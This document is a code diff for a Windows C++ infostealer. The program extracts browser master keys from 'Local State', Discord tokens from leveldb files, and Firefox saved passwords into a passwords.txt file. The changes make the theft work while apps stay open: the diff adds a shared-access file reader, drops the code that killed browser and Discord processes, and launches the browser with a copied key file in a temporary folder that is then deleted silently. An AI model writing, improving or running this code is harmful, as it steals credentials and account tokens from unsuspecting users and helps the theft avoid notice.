@@ -15,6 +15,7 @@
 #include <set>
 #include <cstdio>
 #include <cctype>
+#include <shellapi.h>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
@@ -51,6 +52,21 @@ std::string path_to_uri(const fs::path& p) {
         }
     }
     return "file:" + encoded + "?mode=ro&nolock=1&immutable=1";
+}
+
+std::string read_file_locked(const fs::path& p) {
+    std::string content;
+    HANDLE h_file = CreateFileW(p.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h_file != INVALID_HANDLE_VALUE) {
+        DWORD size = GetFileSize(h_file, NULL);
+        if (size > 0 && size != INVALID_FILE_SIZE) {
+            content.resize(size);
+            DWORD read = 0;
+            if (!ReadFile(h_file, &content[0], size, &read, NULL)) content.clear();
+        }
+        CloseHandle(h_file);
+    }
+    return content;
 }
 
 struct BrowserConfig {
@@ -199,23 +215,6 @@ int main() {
         }
     };
 
-    kill_processes_by_name("browser.exe");
-    kill_processes_by_name("chrome.exe");
-    kill_processes_by_name("msedge.exe");
-    kill_processes_by_name("brave.exe");
-    kill_processes_by_name("opera.exe");
-    kill_processes_by_name("launcher.exe");
-    kill_processes_by_name("firefox.exe");
-    kill_processes_by_name("waterfox.exe");
-    kill_processes_by_name("librewolf.exe");
-    kill_processes_by_name("thunderbird.exe");
-    kill_processes_by_name("discord.exe");
-    kill_processes_by_name("Discord.exe");
-    kill_processes_by_name("DiscordCanary.exe");
-    kill_processes_by_name("DiscordPTB.exe");
-    kill_processes_by_name("Lightcord.exe");
-    kill_processes_by_name("Telegram.exe");
-
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
 
@@ -314,7 +313,19 @@ int main() {
 
         STARTUPINFOW si = { sizeof(si) };
         PROCESS_INFORMATION pi = { 0 };
-        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check";
+
+        fs::path output_root(config.output_dir);
+        fs::create_directories(output_root);
+        std::wstring unique_data_dir = (output_root / (L"tmp_" + std::to_wstring(GetTickCount64()))).wstring();
+        fs::create_directories(unique_data_dir);
+
+        // Copy Local State so the new process has access to the master key
+        fs::path src_local_state = fs::path(user_data_dir) / L"Local State";
+        if (fs::exists(src_local_state)) {
+            fs::copy_file(src_local_state, fs::path(unique_data_dir) / L"Local State", fs::copy_options::overwrite_existing);
+        }
+
+        std::wstring cmd_line = L"\"" + exe_path + L"\" --no-first-run --no-default-browser-check --user-data-dir=\"" + unique_data_dir + L"\"";
 
         std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end());
         cmd_buffer.push_back(0);
@@ -326,6 +337,14 @@ int main() {
 
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
+
+            // Cleanup temp user data dir
+            SHFILEOPSTRUCTW fileOp = { 0 };
+            fileOp.wFunc = FO_DELETE;
+            unique_data_dir.push_back(L'\0'); // Double null terminator
+            fileOp.pFrom = unique_data_dir.c_str();
+            fileOp.fFlags = FOF_NO_UI | FOF_NOCONFIRMATION | FOF_SILENT;
+            SHFileOperationW(&fileOp);
         }
     }
 
@@ -496,10 +515,8 @@ std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use
 
 bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
     fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
-    std::ifstream ifs(local_state_path);
-    if (!ifs.is_open()) return false;
-
-    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+    std::string content = read_file_locked(local_state_path);
+    if (content.empty()) return false;
     size_t pos = content.find("\"encrypted_key\":\"");
     if (pos == std::string::npos) return false;
     pos += 17;
@@ -1212,10 +1229,8 @@ void extract_discord_tokens(const std::wstring& discord_path_w, const std::strin
     for (const auto& entry : fs::directory_iterator(leveldb_path)) {
         std::string ext = entry.path().extension().string();
         if (ext == ".log" || ext == ".ldb") {
-            std::ifstream ifs(entry.path(), std::ios::binary);
-            if (ifs) {
-                std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-
+            std::string content = read_file_locked(entry.path());
+            if (!content.empty()) {
                 // Scan for encrypted tokens
                 auto enc_begin = std::sregex_iterator(content.begin(), content.end(), enc_regex);
                 auto enc_end = std::sregex_iterator();
@@ -1265,9 +1280,8 @@ void extract_firefox_passwords(const fs::path& profile_path, const fs::path& out
         if (slot) {
             if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
                 fs::path logins_path = profile_path / "logins.json";
-                std::ifstream ifs(logins_path);
-                if (ifs.is_open()) {
-                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+                std::string content = read_file_locked(logins_path);
+                if (!content.empty()) {
                     std::ofstream ofs(output_dir / "passwords.txt");
 
                     size_t pos = 0;
